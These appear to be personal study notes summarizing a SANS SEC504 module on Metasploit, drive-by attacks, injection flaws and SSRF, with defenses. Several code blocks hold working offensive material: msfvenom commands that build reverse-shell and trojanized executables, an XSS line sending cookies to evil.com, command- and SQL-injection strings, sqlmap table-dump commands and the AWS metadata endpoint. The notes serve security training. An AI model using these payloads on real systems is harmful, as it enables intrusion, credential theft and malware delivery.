---
title: Public-Facing and Drive-By Attacks - SEC504.4
parent: SEC504
grand_parent: SANS
great_grand_parent: Categories
nav_order: 4
layout: default
---

# Public-Facing and Drive-By Attacks (Inspired by SANS SEC504.4)

This post summarizes the fourth module of SANS SEC504 and covers exploitation using the Metasploit Framework, drive-by and client-side attacks, injection vulnerabilities (command, XSS, SQL), and relevant defenses. This content reflects my own understanding for learning purposes and does not copy SANS content.

---

## Metasploit Framework

### Overview

* Metasploit is a modular exploitation framework for penetration testing
* Continuously updated with new exploits, payloads, and auxiliary modules
* Runs on Linux, BSD, and macOS

### Core Modules

* **Exploits**: Target known vulnerabilities
* **Payloads**: Deliver malicious functionality (shells, scripts)
* **Auxiliary**: Scanning, fuzzing, etc
* **Post Modules**: Post-exploitation tasks like privilege escalation or data harvesting

### Workflow

1. Search and select exploit
2. Configure target options
3. Select and set payload
4. Run and monitor session

---

## Payloads and Meterpreter

### Payload Options

* Bind shell or reverse shell (TCP/HTTP)
* User creation, DLL injection, persistence
* VNC server injection for GUI control

### Meterpreter Highlights

* Modular post-exploitation shell
* Operates entirely in memory (stealthy)
* TLS-encrypted communication
* Can migrate to other processes

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

### Payload Creation with MsfVenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
```

---

## Drive-By and Client-Side Attacks

### Drive-By Strategy

1. Compromise legitimate website
2. Insert malicious JavaScript or redirect
3. Deliver tailored exploit to visitors

### Variants

* Watering hole: Target industry-specific sites
* Fake installers: Repackaged software with embedded payloads
* Office macros: Embedded code requiring user interaction

### Defenses

* Patch management
* Threat intel and IOC monitoring
* Use allowlists, behavior-based detection, EDR/XDR

---

## BeEF and Social Engineering Payloads

### BeEF Framework

* Browser Exploitation Framework
* Exploits active browser sessions

```bash
sudo beef
```

* Includes fake update prompts, phishing dialogs

### Payload Templates

* Combine legitimate executables with Meterpreter payloads:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -k -x legitimate.exe -f exe -o trojan.exe
```

---

## Command Injection

### Concept

* Unsanitized user input reaches the shell
* Allows chaining or substitution of commands

### Payload Examples

```bash
cat /?;
echo injected;
$(whoami);
| id;
|| ls;
```

### Detection & Defense

* Audit source code for dangerous functions: `exec`, `system`, `shell_exec`
* Validate and sanitize all user input
* Apply WAF for temporary mitigation
* Monitor outbound activity from web servers

---

## Cross-Site Scripting (XSS)

### Overview

* XSS exploits client-side trust in the web app
* Delivered via URL parameters, stored input, or reflected content

### Types

* **Stored XSS**: Persisted on server (e.g., comment section)
* **Reflected XSS**: Injected via URL (e.g., search queries)

### Impact

* Session hijacking
* Keystroke logging
* Fake login pages
* Internal network scanning
* Cookie theft:

```html
<script>document.location='http://evil.com/save?c='+document.cookie</script>
```

### Testing and Defense

* Use fuzzing strings: `<script>alert(1)</script>` or `'';!--"<XSS>=&{()}`
* Sanitize/encode input and output
* Set HTTPOnly and Secure flags on cookies
* Apply Content Security Policy (CSP):

```bash
wget --server-response http://site.com 2>&1 | grep -E "Content-Security-Policy|Set-Cookie"
```

---

## SQL Injection (SQLi)

### Concept

* Unsanitized input modifies backend SQL queries
* Common in GET/POST requests or form inputs

### Testing

```sql
' OR '1'='1
--
" OR 1=1
```

### Enumeration with Sqlmap

```bash
sqlmap -u "http://site.com/page.php?id=1" --dbs
sqlmap -u "http://site.com/page.php?id=1" -D db --tables
sqlmap -u "http://site.com/page.php?id=1" -D db -T users --columns
sqlmap -u "http://site.com/page.php?id=1" -D db -T users --dump
```

### Defense

* Use parameterized queries / prepared statements
* Least-privilege DB accounts
* Monitor for SQL errors and anomalies
* Consider WAF like ModSecurity

---

## SSRF and Instance Metadata

### Server-Side Request Forgery (SSRF)

* Occurs when user-controlled input is used in server-side HTTP requests
* Can lead to:

  * Cloud internal service discovery
  * Credential access (IMDS v1)

### IMDS Targeting in Cloud

* AWS IMDS: `http://169.254.169.254/latest/meta-data/`
* Google/Azure similar endpoints

### Prevention

* Enforce allowlists for URL destinations
* Upgrade to IMDSv2 on AWS
* Monitor internal web services for odd outbound traffic

---

## Summary

This module exposes the attacker mindset from exploit delivery to advanced client-side abuse and command injections. The blend of Metasploit, scripting, and application-layer attacks reinforces the need for robust defensive layering, code validation, and secure development practices.

*Training inspired by SANS SEC504. Rewritten for educational reference only.*
